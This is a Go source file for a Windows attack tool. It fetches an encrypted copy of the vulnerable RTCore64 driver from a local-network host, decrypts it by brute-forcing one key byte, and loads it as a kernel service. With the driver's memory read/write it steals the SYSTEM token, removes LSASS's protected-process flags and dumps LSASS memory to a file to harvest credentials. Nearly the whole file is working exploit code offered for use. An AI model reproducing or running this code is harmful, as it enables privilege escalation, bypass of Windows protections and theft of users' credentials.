package main

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"io"
	"net/http"
	"os"
    "strings"
	"encoding/hex"

	"golang.org/x/sys/windows"
	
)

const (
	RTCORE64_MEMORY_READ_CODE  = 0x80002048
	RTCORE64_MEMORY_WRITE_CODE = 0x8000204c
	SYSTEM_PID                 = 4
	KERNEL_ADDRESS_MASK        = 0xFFFF000000000000
	SEARCH_RANGE               = 0x1000 
	KNOWN_TOKEN_OFFSET         = 0x248  // The exact token offset for my testing VM

	KEYSIZE = 32
	IVSIZE  = 16

    DONT_RESOLVE_DLL_REFERENCES = 0x00000001
	PROCESS_ALL_ACCESS          = 0x1F0FFF
	TH32CS_SNAPPROCESS          = 0x00000002
	MAX_PATH                    = 260
)


var (
	PPOffset  uint16
	PPLOffset uint16
)

type RTCORE64_MEMORY_READ struct {
	Pad0     [8]byte
	Address  uint64
	Pad1     [8]byte
	ReadSize uint32
	Value    uint32
	Pad3     [16]byte
}

type RTCORE64_MEMORY_WRITE struct {
	Pad0     [8]byte
	Address  uint64
	Pad1     [8]byte
	ReadSize uint32
	Value    uint32
	Pad3     [16]byte
}

var (
	modKernel32             = windows.NewLazySystemDLL("kernel32.dll")
    modPsapi                = windows.NewLazySystemDLL("psapi.dll")
    modDbghelp = windows.NewLazySystemDLL("Dbghelp.dll")

	procDeviceIoControl     = modKernel32.NewProc("DeviceIoControl")
	procCreateFileW         = modKernel32.NewProc("CreateFileW")
	procCloseHandle         = modKernel32.NewProc("CloseHandle")
	procGetCurrentProcessId = modKernel32.NewProc("GetCurrentProcessId")
	procCreateProcessW      = modKernel32.NewProc("CreateProcessW")
	procWaitForSingleObject = modKernel32.NewProc("WaitForSingleObject")
	procEnumDeviceDrivers   = modPsapi.NewProc("EnumDeviceDrivers")

	procCreateToolhelp32Snapshot = modKernel32.NewProc("CreateToolhelp32Snapshot")
    procProcess32First          = modKernel32.NewProc("Process32FirstW")
    procProcess32Next           = modKernel32.NewProc("Process32NextW")
    procOpenProcess             = modKernel32.NewProc("OpenProcess")
    procMiniDumpWriteDump       = modDbghelp.NewProc("MiniDumpWriteDump")
	procLoadLibraryExA          = modKernel32.NewProc("LoadLibraryExA")
	procGetProcAddress          = modKernel32.NewProc("GetProcAddress")
)

func DeviceIoControl(hDevice windows.Handle, ioControlCode uint32, inBuffer *byte, inBufferSize uint32, outBuffer *byte, outBufferSize uint32, bytesReturned *uint32, overlapped *windows.Overlapped) (err error) {
	r1, _, e1 := syscall.Syscall9(procDeviceIoControl.Addr(), 9, uintptr(hDevice), uintptr(ioControlCode), uintptr(unsafe.Pointer(inBuffer)), uintptr(inBufferSize), uintptr(unsafe.Pointer(outBuffer)), uintptr(outBufferSize), uintptr(unsafe.Pointer(bytesReturned)), uintptr(unsafe.Pointer(overlapped)), 0)
	if r1 == 0 {
		return e1
	}
	return nil
}

func CreateFileW(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, lpSecurityAttributes *windows.SecurityAttributes, dwCreationDisposition uint32, dwFlagsAndAttributes uint32, hTemplateFile windows.Handle) (handle windows.Handle, err error) {
	r1, _, e1 := syscall.Syscall9(procCreateFileW.Addr(), 7, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(lpFileName))), uintptr(dwDesiredAccess), uintptr(dwShareMode), uintptr(unsafe.Pointer(lpSecurityAttributes)), uintptr(dwCreationDisposition), uintptr(dwFlagsAndAttributes), uintptr(hTemplateFile), 0, 0)
	handle = windows.Handle(r1)
	if handle == windows.InvalidHandle {
		err = e1
	}
	return
}

func CloseHandle(hObject windows.Handle) (err error) {
	r1, _, e1 := syscall.Syscall(procCloseHandle.Addr(), 1, uintptr(hObject), 0, 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func GetCurrentProcessId() (id uint32) {
	r0, _, _ := syscall.Syscall(procGetCurrentProcessId.Addr(), 0, 0, 0, 0)
	id = uint32(r0)
	return
}

func CreateProcessW(lpApplicationName *uint16, lpCommandLine *uint16, lpProcessAttributes *windows.SecurityAttributes, lpThreadAttributes *windows.SecurityAttributes, bInheritHandles bool, dwCreationFlags uint32, lpEnvironment *byte, lpCurrentDirectory *uint16, lpStartupInfo *windows.StartupInfo, lpProcessInformation *windows.ProcessInformation) (err error) {
	var _p0 uint32
	if bInheritHandles {
		_p0 = 1
	}
	r1, _, e1 := syscall.Syscall12(procCreateProcessW.Addr(), 10, uintptr(unsafe.Pointer(lpApplicationName)), uintptr(unsafe.Pointer(lpCommandLine)), uintptr(unsafe.Pointer(lpProcessAttributes)), uintptr(unsafe.Pointer(lpThreadAttributes)), uintptr(_p0), uintptr(dwCreationFlags), uintptr(unsafe.Pointer(lpEnvironment)), uintptr(unsafe.Pointer(lpCurrentDirectory)), uintptr(unsafe.Pointer(lpStartupInfo)), uintptr(unsafe.Pointer(lpProcessInformation)), 0, 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func WaitForSingleObject(hHandle windows.Handle, dwMilliseconds uint32) (err error) {
	r1, _, e1 := syscall.Syscall(procWaitForSingleObject.Addr(), 2, uintptr(hHandle), uintptr(dwMilliseconds), 0)
	if r1 == windows.WAIT_FAILED {
		err = e1
	}
	return
}

func EnumDeviceDrivers(lpImageBase *uintptr, cb uint32, lpcbNeeded *uint32) (err error) {
	r1, _, e1 := syscall.Syscall(procEnumDeviceDrivers.Addr(), 3, uintptr(unsafe.Pointer(lpImageBase)), uintptr(cb), uintptr(unsafe.Pointer(lpcbNeeded)))
	if r1 == 0 {
		err = e1
	}
	return
}

func GetNtoskrnlBase() (uint64, error) {
	var drivers [1024]uintptr
	var cbNeeded uint32
	err := EnumDeviceDrivers(&drivers[0], uint32(len(drivers))*uint32(unsafe.Sizeof(drivers[0])), &cbNeeded)
	if err != nil {
		return 0, err
	}
	if uintptr(cbNeeded) > uintptr(len(drivers))*unsafe.Sizeof(drivers[0]) {
		return 0, fmt.Errorf("buffer too small")
	}
	return uint64(drivers[0]), nil
}

func ReadMemoryPrimitive(device windows.Handle, size uint32, address uint64) (uint32, error) {
	memoryRead := RTCORE64_MEMORY_READ{
		Address:  address,
		ReadSize: size,
	}
	var bytesReturned uint32
	err := DeviceIoControl(
		device,
		RTCORE64_MEMORY_READ_CODE,
		(*byte)(unsafe.Pointer(&memoryRead)),
		uint32(unsafe.Sizeof(memoryRead)),
		(*byte)(unsafe.Pointer(&memoryRead)),
		uint32(unsafe.Sizeof(memoryRead)),
		&bytesReturned,
		nil,
	)
	if err != nil {
		return 0, err
	}
	return memoryRead.Value, nil
}

func WriteMemoryPrimitive(device windows.Handle, size uint32, address uint64, value uint32) error {
	memoryWrite := RTCORE64_MEMORY_WRITE{
		Address:  address,
		ReadSize: size,
		Value:    value,
	}
	var bytesReturned uint32
	err := DeviceIoControl(
		device,
		RTCORE64_MEMORY_WRITE_CODE,
		(*byte)(unsafe.Pointer(&memoryWrite)),
		uint32(unsafe.Sizeof(memoryWrite)),
		(*byte)(unsafe.Pointer(&memoryWrite)),
		uint32(unsafe.Sizeof(memoryWrite)),
		&bytesReturned,
		nil,
	)
	return err
}

func ReadMemoryDWORD(device windows.Handle, address uint64) (uint32, error) {
	return ReadMemoryPrimitive(device, 4, address)
}

func ReadMemoryDWORD64(device windows.Handle, address uint64) (uint64, error) {
	low, err := ReadMemoryDWORD(device, address)
	if err != nil {
		return 0, err
	}
	high, err := ReadMemoryDWORD(device, address+4)
	if err != nil {
		return 0, err
	}
	return uint64(high)<<32 | uint64(low), nil
}

func WriteMemoryDWORD64(device windows.Handle, address uint64, value uint64) error {
	err := WriteMemoryPrimitive(device, 4, address, uint32(value))
	if err != nil {
		return err
	}
	return WriteMemoryPrimitive(device, 4, address+4, uint32(value>>32))
}

// ReadMemory - Read arbitrary length memory
func ReadMemory(device windows.Handle, address uint64, buffer []byte) error {
	for i := 0; i < len(buffer); i += 4 {
		remaining := len(buffer) - i
		readSize := 4
		if remaining < 4 {
			readSize = remaining
		}

		val, err := ReadMemoryPrimitive(device, uint32(readSize), address+uint64(i))
		if err != nil {
			return err
		}

		for j := 0; j < readSize; j++ {
			buffer[i+j] = byte(val >> (j * 8))
		}
	}
	return nil
}

func isValidToken(device windows.Handle, val uint64) bool {
    if val == 0 {
        return false
    }

    if (val & KERNEL_ADDRESS_MASK) != KERNEL_ADDRESS_MASK {
        return false
    }

   // fmt.Println(val)
    tokenAddr := val & ^uint64(0xF)
   // fmt.Println(tokenAddr)
   
    buf := make([]byte, 8)
    err := ReadMemory(device, tokenAddr, buf) 
    if err != nil {
        return false
    }

    src := string(buf)
    if src == "*SYSTEM*" {
        fmt.Printf("[*] Confirmed SYSTEM token at 0x%X\n", tokenAddr)
        return true
    }

    return false
}

func FindOffsets(device windows.Handle, psInitialSystemProcessAddress uint64) (tokenOffset, activeProcessLinksOffset, uniqueProcessIdOffset uint64, err error) {
	
	for i := uint64(0); i < SEARCH_RANGE; i += 8 {
		val, err := ReadMemoryDWORD64(device, psInitialSystemProcessAddress+i)
		if err != nil {
			continue
		}
		if val == SYSTEM_PID {
			uniqueProcessIdOffset = i
			log.Printf("[*] Found UniqueProcessIdOffset: 0x%X", uniqueProcessIdOffset)
			break
		}
	}
	if uniqueProcessIdOffset == 0 {
		return 0, 0, 0, fmt.Errorf("could not find PID offset")
	}


	activeProcessLinksOffset = uniqueProcessIdOffset + 8
	log.Printf("[*] Calculated ActiveProcessLinksOffset: 0x%X", activeProcessLinksOffset)

/*
	var candidates []uint64
	for i := uint64(0); i < SEARCH_RANGE; i += 8 {
		val, err := ReadMemoryDWORD64(device, psInitialSystemProcessAddress+i)
		if err != nil {
			continue
		}
		if isValidToken(device,val) {
			log.Printf("[*] Possible TokenOffset found at 0x%X (value: 0x%X)", i, val)
			candidates = append(candidates, i)
		}
	}
*/
    return KNOWN_TOKEN_OFFSET, activeProcessLinksOffset, uniqueProcessIdOffset, nil
	//return candidates[0], activeProcessLinksOffset, uniqueProcessIdOffset, nil
}


// --------------------
// Download file from URL
// --------------------
func DownloadFile(url, filePath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

// --------------------
// AES-CBC decryption in memory
// --------------------
func DecryptData(cipherText, key, iv []byte) ([]byte, error) {
	if len(cipherText)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("cipherText is not a multiple of block size")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plainText := make([]byte, len(cipherText))
	mode.CryptBlocks(plainText, cipherText)

	// PKCS#7 padding removal
	padding := int(plainText[len(plainText)-1])
	if padding <= 0 || padding > aes.BlockSize {
		return nil, fmt.Errorf("invalid padding")
	}
	plainText = plainText[:len(plainText)-padding]

	return plainText, nil
}

// --------------------
// Validate PE / .sys driver in memory
// --------------------
func IsValidSysFile(data []byte) bool {
	if len(data) < 64 {
		return false
	}
	if !bytes.Equal(data[:2], []byte("MZ")) { // DOS header
		return false
	}
	peOffset := binary.LittleEndian.Uint32(data[0x3C:0x40])
	if int(peOffset+4) >= len(data) {
		return false
	}
	if !bytes.Equal(data[peOffset:peOffset+4], []byte("PE\x00\x00")) {
		return false
	}
	return true
}

// --------------------
// Windows service: create and start driver
// --------------------
func RunDriverService(driverPath string) error {
	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procOpenSCManagerW := modadvapi32.NewProc("OpenSCManagerW")
	procCreateServiceW := modadvapi32.NewProc("CreateServiceW")
	procOpenServiceW := modadvapi32.NewProc("OpenServiceW")
	procStartServiceW := modadvapi32.NewProc("StartServiceW")
	procCloseServiceHandle := modadvapi32.NewProc("CloseServiceHandle")

	hSCManager, _, _ := procOpenSCManagerW.Call(
		0, 0,
		uintptr(windows.SC_MANAGER_CREATE_SERVICE),
	)
	if hSCManager == 0 {
		return fmt.Errorf("OpenSCManager failed: %v", syscall.GetLastError())
	}
	defer procCloseServiceHandle.Call(hSCManager)

	serviceName := "MyRTCore64Servisssssssssssssssss"
	driverPathPtr := syscall.StringToUTF16Ptr(driverPath)
	serviceNamePtr := syscall.StringToUTF16Ptr(serviceName)

	hService, _, _ := procCreateServiceW.Call(
		hSCManager,
		uintptr(unsafe.Pointer(serviceNamePtr)),
		uintptr(unsafe.Pointer(serviceNamePtr)),
		uintptr(windows.SERVICE_START|windows.SERVICE_STOP|windows.DELETE),
		uintptr(windows.SERVICE_KERNEL_DRIVER),
		uintptr(windows.SERVICE_DEMAND_START),
		uintptr(windows.SERVICE_ERROR_IGNORE),
		uintptr(unsafe.Pointer(driverPathPtr)),
		0, 0, 0, 0, 0,
	)

	if hService == 0 {
		if errno := syscall.GetLastError(); errno != windows.ERROR_SERVICE_EXISTS {
			return fmt.Errorf("CreateService failed: %v", errno)
		}
		hService, _, _ = procOpenServiceW.Call(
			hSCManager,
			uintptr(unsafe.Pointer(serviceNamePtr)),
			uintptr(windows.SERVICE_START|windows.SERVICE_STOP),
		)
		if hService == 0 {
			return fmt.Errorf("OpenService failed: %v", syscall.GetLastError())
		}
	}
	defer procCloseServiceHandle.Call(hService)

	procStartServiceW.Call(hService, 0, 0)
	fmt.Println("[+] Driver service started")
	return nil
}

// --------------------
// Helper: read file to memory
// --------------------
func ReadFileBytes(path string) ([]byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return nil, err
	}

	data := make([]byte, info.Size())
	_, err = f.Read(data)
	return data, err
}

// --------------------
// Helper: lsass dump helper functions
// --------------------

func CreateToolhelp32Snapshot(flags, processID uint32) (windows.Handle, error) {
    ret, _, err := procCreateToolhelp32Snapshot.Call(
        uintptr(flags),
        uintptr(processID),
    )
    if ret == uintptr(windows.InvalidHandle) {
        return windows.InvalidHandle, err
    }
    return windows.Handle(ret), nil
}

func Process32First(snapshot windows.Handle, processEntry *windows.ProcessEntry32) error {
    ret, _, err := procProcess32First.Call(
        uintptr(snapshot),
        uintptr(unsafe.Pointer(processEntry)),
    )
    if ret == 0 {
        return err
    }
    return nil
}

func Process32Next(snapshot windows.Handle, processEntry *windows.ProcessEntry32) error {
    ret, _, err := procProcess32Next.Call(
        uintptr(snapshot),
        uintptr(unsafe.Pointer(processEntry)),
    )
    if ret == 0 {
        return err
    }
    return nil
}

func OpenProcess(desiredAccess uint32, inheritHandle bool, processId uint32) (windows.Handle, error) {
    inherit := uint32(0)
    if inheritHandle {
        inherit = 1
    }
    
    ret, _, err := procOpenProcess.Call(
        uintptr(desiredAccess),
        uintptr(inherit),
        uintptr(processId),
    )
    if ret == 0 {
        return windows.InvalidHandle, err
    }
    return windows.Handle(ret), nil
}

func CreateFile(filename string, desiredAccess, shareMode uint32, securityAttributes *windows.SecurityAttributes, creationDisposition, flagsAndAttributes uint32, templateFile windows.Handle) (windows.Handle, error) {
    filenamePtr, err := windows.UTF16PtrFromString(filename)
    if err != nil {
        return windows.InvalidHandle, err
    }
    
    ret, _, err := procCreateFileW.Call(
        uintptr(unsafe.Pointer(filenamePtr)),
        uintptr(desiredAccess),
        uintptr(shareMode),
        uintptr(unsafe.Pointer(securityAttributes)),
        uintptr(creationDisposition),
        uintptr(flagsAndAttributes),
        uintptr(templateFile),
    )
    if ret == uintptr(windows.InvalidHandle) {
        return windows.InvalidHandle, err
    }
    return windows.Handle(ret), nil
}

func MiniDumpWriteDump(process windows.Handle, processId uint32, file windows.Handle, dumpType uint32, exceptionParam uintptr, userStreamParam uintptr, callbackParam uintptr) error {
    ret, _, err := procMiniDumpWriteDump.Call(
        uintptr(process),
        uintptr(processId),
        uintptr(file),
        uintptr(dumpType),
        exceptionParam,
        userStreamParam,
        callbackParam,
    )
    if ret == 0 {
        return err
    }
    return nil
}

// to find process ID by name
func FindProcessID(name string) (uint32, error) {
    snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
    if err != nil {
        return 0, err
    }
    defer windows.CloseHandle(snapshot)

    var entry windows.ProcessEntry32
    entry.Size = uint32(unsafe.Sizeof(entry))
    
    err = Process32First(snapshot, &entry)
    if err != nil {
        return 0, err
    }
    
    for {
        processName := windows.UTF16ToString(entry.ExeFile[:])
        if strings.EqualFold(strings.TrimSpace(processName), name) {
            return entry.ProcessID, nil
        }
        
        err = windows.Process32Next(snapshot, &entry)
        if err != nil {
            break
        }
    }
    
    return 0, fmt.Errorf("process not found")
}


// function to enable SeDebugPrivilege
func EnableDebugPrivilege() error {
    var token windows.Token
    currentProcess, _ := windows.GetCurrentProcess()
    err := windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
    if err != nil {
        return err
    }
    defer token.Close()

    var luid windows.LUID
    err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
    if err != nil {
        return err
    }

    privileges := windows.Tokenprivileges{}
    privileges.PrivilegeCount = 1
    privileges.Privileges[0] = windows.LUIDAndAttributes{
        Luid: luid,
        Attributes: windows.SE_PRIVILEGE_ENABLED,
    }

    return windows.AdjustTokenPrivileges(token, false, &privileges, uint32(unsafe.Sizeof(privileges)), nil, nil)
}



func FindLsassEPROCESS(device windows.Handle, psInitialSystemProcessAddress, activeProcessLinksOffset, uniqueProcessIdOffset uint64, lsassPID uint32) (uint64, error) {
	currentProcess := psInitialSystemProcessAddress
	var lsassEPROCESS uint64

	for {
		// Read the process ID
		pid, err := ReadMemoryDWORD64(device, currentProcess+uniqueProcessIdOffset)
		if err != nil {
			return 0, fmt.Errorf("failed to read process ID at 0x%X: %v", currentProcess+uniqueProcessIdOffset, err)
		}

		// Check if this is the LSASS process
		if uint32(pid) == lsassPID {
			lsassEPROCESS = currentProcess
			log.Printf("[*] Found LSASS EPROCESS at 0x%X", lsassEPROCESS)
			break
		}

		// Get the next process in the list
		flink, err := ReadMemoryDWORD64(device, currentProcess+activeProcessLinksOffset)
		if err != nil {
			return 0, fmt.Errorf("failed to read FLINK at 0x%X: %v", currentProcess+activeProcessLinksOffset, err)
		}

		// Calculate the next process address
		nextProcess := flink - activeProcessLinksOffset

		// Check if we've looped back to the beginning
		if nextProcess == psInitialSystemProcessAddress {
			return 0, fmt.Errorf("LSASS process not found in the process list")
		}

		currentProcess = nextProcess
	}

	return lsassEPROCESS, nil
}

func DisablePPL(device windows.Handle, lsassEPROCESS uint64) error {
	// Calculate the addresses of the PP and PPL flags
	ppFlagAddress := lsassEPROCESS + uint64(PPOffset)
	pplFlagAddress := lsassEPROCESS + uint64(PPLOffset)

	log.Printf("[*] PP flag address: 0x%X", ppFlagAddress)
	log.Printf("[*] PPL flag address: 0x%X", pplFlagAddress)

	// Write 0 to disable PPL protection
	log.Println("[*] Disabling PP protection...")
	err := WriteMemoryPrimitive(device, 1, ppFlagAddress, 0)
	if err != nil {
		return fmt.Errorf("failed to write to PP flag: %v", err)
	}

	log.Println("[*] Disabling PPL protection...")
	err = WriteMemoryPrimitive(device, 1, pplFlagAddress, 0)
	if err != nil {
		return fmt.Errorf("failed to write to PPL flag: %v", err)
	}

	log.Println("[+] PPL protection disabled successfully")
	return nil
}



// --------------------
// Helper: PPL and PPO disable helper functions
// --------------------


func loadLibraryExA(name string, flags uintptr) (uintptr, error) {
	ret, _, err := procLoadLibraryExA.Call(
		uintptr(unsafe.Pointer(syscall.StringBytePtr(name))),
		0,
		flags,
	)
	if ret == 0 {
		return 0, err
	}
	return ret, nil
}

func getProcAddress(module uintptr, procName string) (uintptr, error) {
	ret, _, err := procGetProcAddress.Call(
		module,
		uintptr(unsafe.Pointer(syscall.StringBytePtr(procName))),
	)
	if ret == 0 {
		return 0, err
	}
	return ret, nil
}

func Read16(device windows.Handle, addr uint64) (uint16, error) {
	val, err := ReadMemoryPrimitive(device, 2, addr)
	if err != nil {
		return 0, err
	}
	return uint16(val), nil
}

func FindPPOffsets(device windows.Handle) error {
	hNtos, err := loadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe", DONT_RESOLVE_DLL_REFERENCES)
	if err != nil || hNtos == 0 {
		return fmt.Errorf("failed to map ntoskrnl.exe: %v", err)
	}

	PsIsProtectedProcessPTR, err := getProcAddress(hNtos, "PsIsProtectedProcess")
	if err != nil {
		return fmt.Errorf("GetProcAddress PsIsProtectedProcess failed: %v", err)
	}
	PPrva := PsIsProtectedProcessPTR - hNtos

	PsIsProtectedProcessLightPTR, err := getProcAddress(hNtos, "PsIsProtectedProcessLight")
	if err != nil {
		return fmt.Errorf("GetProcAddress PsIsProtectedProcessLight failed: %v", err)
	}
	PPLrva := PsIsProtectedProcessLightPTR - hNtos

	krnlBase, err := GetNtoskrnlBase()
	if err != nil {
		return fmt.Errorf("failed to get kernel base: %v", err)
	}

	realPPAddr := uint64(krnlBase) + uint64(PPrva)
	realPPLAddr := uint64(krnlBase) + uint64(PPLrva)

	ppVal, err := Read16(device, realPPAddr+0x2)
	if err != nil {
		return fmt.Errorf("failed to read at 0x%X: %v", realPPAddr+0x2, err)
	}
	PPOffset = ppVal

	pplVal, err := Read16(device, realPPLAddr+0x2)
	if err != nil {
		return fmt.Errorf("failed to read at 0x%X: %v", realPPLAddr+0x2, err)
	}
	PPLOffset = pplVal

	fmt.Printf("PPOffset = 0x%X\n", PPOffset)
	fmt.Printf("PPLOffset = 0x%X\n", PPLOffset)

	return nil
}


func main() {

    baseKey := []byte{
		0x00, // first byte to brute-force
		0x3E, 0x4C, 0x6F, 0xD9, 0x12, 0x83, 0x7A,
		0xA4, 0x6E, 0xA0, 0x50, 0x53, 0x28, 0xED, 0x7B,
		0xB2, 0x0E, 0xD2, 0x3B, 0x37, 0x28, 0xA4, 0xEF,
		0x78, 0x22, 0x88, 0x0B, 0xE8, 0xD0, 0xBE, 0x45,
	}
	iv := make([]byte, IVSIZE)

	// Download encrypted driver
	encryptedPath := "C:\\Temp\\driver.enc"
	if err := DownloadFile("http://192.168.226.1:8000/RTCore64.sys.enc", encryptedPath); err != nil {
		fmt.Printf("[!] Download failed: %v\n", err)
		return
	}

	// Read encrypted file into memory
	cipherData, err := ReadFileBytes(encryptedPath)
	if err != nil {
		fmt.Printf("[!] Failed to read encrypted file: %v\n", err)
		return
	}

	var found bool
	for i := 0; i < 256; i++ {
		baseKey[0] = byte(i)
		plainData, err := DecryptData(cipherData, baseKey, iv)
		if err != nil {
			continue
		}

		if IsValidSysFile(plainData) {
			found = true
			outputPath := "C:\\Windows\\System32\\drivers\\RTCore64.sys"
			os.WriteFile(outputPath, plainData, 0644)
			fmt.Printf("[+] Valid driver found with key first byte: 0x%02X\n", i)

			if err := RunDriverService(outputPath); err != nil {
				fmt.Printf("[!] Failed to start driver: %v\n", err)
			}
			break
		}
	}

	if !found {
		fmt.Println("[!] Failed to decrypt valid driver")
	}

	os.Remove(encryptedPath)

	device, err := CreateFileW(
		`\\.\RTCore64`,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		log.Fatal("[!] Unable to obtain a handle to the device object")
	}
	defer CloseHandle(device)
	log.Println("[*] Device object handle has been obtained")

	ntoskrnlBase, err := GetNtoskrnlBase()
	if err != nil {
		log.Fatal("[!] Failed to get ntoskrnl base address")
	}
	log.Printf("[*] Ntoskrnl base address: 0x%X", ntoskrnlBase)

	ntoskrnl, err := windows.LoadLibrary("ntoskrnl.exe")
	if err != nil {
		log.Fatal("[!] Failed to load ntoskrnl.exe")
	}
	defer windows.FreeLibrary(ntoskrnl)
	procAddr, err := windows.GetProcAddress(ntoskrnl, "PsInitialSystemProcess")
	if err != nil {
		log.Fatal("[!] Failed to get PsInitialSystemProcess address")
	}
	psInitialSystemProcessOffset := uint64(procAddr) - uint64(ntoskrnl)
	psInitialSystemProcessAddress, err := ReadMemoryDWORD64(device, ntoskrnlBase+psInitialSystemProcessOffset)
	if err != nil {
		log.Fatal("[!] Failed to read PsInitialSystemProcess address")
	}
	log.Printf("[*] PsInitialSystemProcess address: 0x%X", psInitialSystemProcessAddress)

	tokenOffset, activeProcessLinksOffset, uniqueProcessIdOffset, err := FindOffsets(device, psInitialSystemProcessAddress)
	if err != nil {
		log.Fatal("[!] Failed to find offsets")
	}

	fmt.Printf("[+] tokenOffset = 0x%x\n", tokenOffset)
	fmt.Printf("[+] activeProcessLinksOffset = 0x%x\n", activeProcessLinksOffset)
	fmt.Printf("[+] uniqueProcessIdOffset = 0x%x\n", uniqueProcessIdOffset)


	systemProcessToken, err := ReadMemoryDWORD64(device, psInitialSystemProcessAddress+tokenOffset)
	if err != nil {
		log.Fatal("[!] Failed to read system process token")
	}
	systemProcessToken &^= 15
	log.Printf("[*] System process token: 0x%X", systemProcessToken)

	currentProcessId := GetCurrentProcessId()
	processHead := psInitialSystemProcessAddress + activeProcessLinksOffset
	currentProcessAddress := processHead
	for {
		processAddress := currentProcessAddress - activeProcessLinksOffset
		uniqueProcessId, err := ReadMemoryDWORD64(device, processAddress+uniqueProcessIdOffset)
		if err != nil {
			log.Fatal("[!] Failed to read UniqueProcessId")
		}
		if uniqueProcessId == uint64(currentProcessId) {
			currentProcessAddress = processAddress
			break
		}
		currentProcessAddress, err = ReadMemoryDWORD64(device, processAddress+activeProcessLinksOffset)
		if err != nil {
			log.Fatal("[!] Failed to read next process link")
		}
		if currentProcessAddress == processHead {
			log.Fatal("[!] Failed to find current process in active process list")
		}
	}
	log.Printf("[*] Current process address: 0x%X", currentProcessAddress)

	currentProcessFastToken, err := ReadMemoryDWORD64(device, currentProcessAddress+tokenOffset)
	if err != nil {
		log.Fatal("[!] Failed to read current process token")
	}
	currentProcessTokenReferenceCounter := currentProcessFastToken & 15
	currentProcessToken := currentProcessFastToken &^ 15
	log.Printf("[*] Current process token: 0x%X", currentProcessToken)

/*
	log.Println("[*] Stealing System process token...")
	err = WriteMemoryDWORD64(device, currentProcessAddress+tokenOffset, currentProcessTokenReferenceCounter|systemProcessToken)
	if err != nil {
		log.Fatal("[!] Failed to write new token")
	}

	log.Println("[*] Spawning new shell...")
	var startupInfo windows.StartupInfo
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
	var processInfo windows.ProcessInformation
	cmdPath := windows.StringToUTF16Ptr("C:\\Windows\\System32\\cmd.exe")
	err = CreateProcessW(
		cmdPath,
		nil,
		nil,
		nil,
		false,
		0,
		nil,
		nil,
		&startupInfo,
		&processInfo,
	)
	if err != nil {
		log.Fatal("[!] Failed to create process")
	}
	defer CloseHandle(processInfo.Process)
	defer CloseHandle(processInfo.Thread)

	WaitForSingleObject(processInfo.Process, windows.INFINITE)
	
*/

    log.Println("[*] Stealing System process token...")
    err = WriteMemoryDWORD64(device, currentProcessAddress+tokenOffset, currentProcessTokenReferenceCounter|systemProcessToken)
    if err != nil {
        log.Fatal("[!] Failed to write new token")
    }
    
log.Printf("[*] stealing system token success")
    // Call this after stealing the token but before opening LSASS
err = EnableDebugPrivilege()
if err != nil {
    log.Fatalf("[!] Failed to enable debug privilege: %v", err)
}

log.Printf("[*] enable debug privilege success")

   // disable PPL/PPO
    
    lsassPID, err := FindProcessID("lsass.exe")
	if err != nil {
		log.Fatalf("[!] Failed to find LSASS PID: %v", err)
	}
	log.Printf("[*] LSASS PID: %d", lsassPID)

	err = FindPPOffsets(device)
	if err != nil {
		log.Fatalf("[!] Failed to find PP offsets: %v", err)
	}

	// Find the LSASS EPROCESS structure
	lsassEPROCESS, err := FindLsassEPROCESS(device, psInitialSystemProcessAddress, activeProcessLinksOffset, uniqueProcessIdOffset, lsassPID)
	if err != nil {
		log.Fatalf("[!] Failed to find LSASS EPROCESS: %v", err)
	}

	// Disable PPL protection by writing 0 to the appropriate addresses
	err = DisablePPL(device, lsassEPROCESS)
	if err != nil {
		log.Fatalf("[!] Failed to disable PPL protection: %v", err)
	}   

hProcess, err := windows.OpenProcess(
    windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
    false,
    lsassPID,
)
if err != nil {
    log.Fatalf("[!] Failed to open LSASS process: %v", err)
}
defer windows.CloseHandle(hProcess)

outputFile := "C:\\Windows\\Temp\\lsass.dmp"
hFile, err := windows.CreateFile(
    windows.StringToUTF16Ptr(outputFile),
    windows.GENERIC_WRITE,
    0,
    nil,
    windows.CREATE_ALWAYS,
    windows.FILE_ATTRIBUTE_NORMAL,
    0,
)
if err != nil {
    log.Fatalf("[!] Failed to create dump file: %v", err)
}
defer windows.CloseHandle(hFile)

log.Printf("[*] create dump file success")

// Call MiniDumpWriteDump
ret, _, err := procMiniDumpWriteDump.Call(
    uintptr(hProcess),
    uintptr(lsassPID),
    uintptr(hFile),
    2, // MiniDumpWithFullMemory
    0,
    0,
    0,
)
if ret == 0 {
    log.Fatalf("[!] Failed to dump LSASS: %v", err)
}
log.Printf("[+] LSASS dumped to %s", outputFile)

// Close the dump file handle before reading
windows.CloseHandle(hFile)

// Read the file content
data, err := os.ReadFile(outputFile)
if err != nil {
    log.Fatalf("[!] Failed to read dump file: %v", err)
}

// Print first 256 bytes in hex (to avoid flooding the terminal)
fmt.Printf("[*] First 256 bytes of dump:\n%s\n",
    hex.Dump(data[:256]))

}

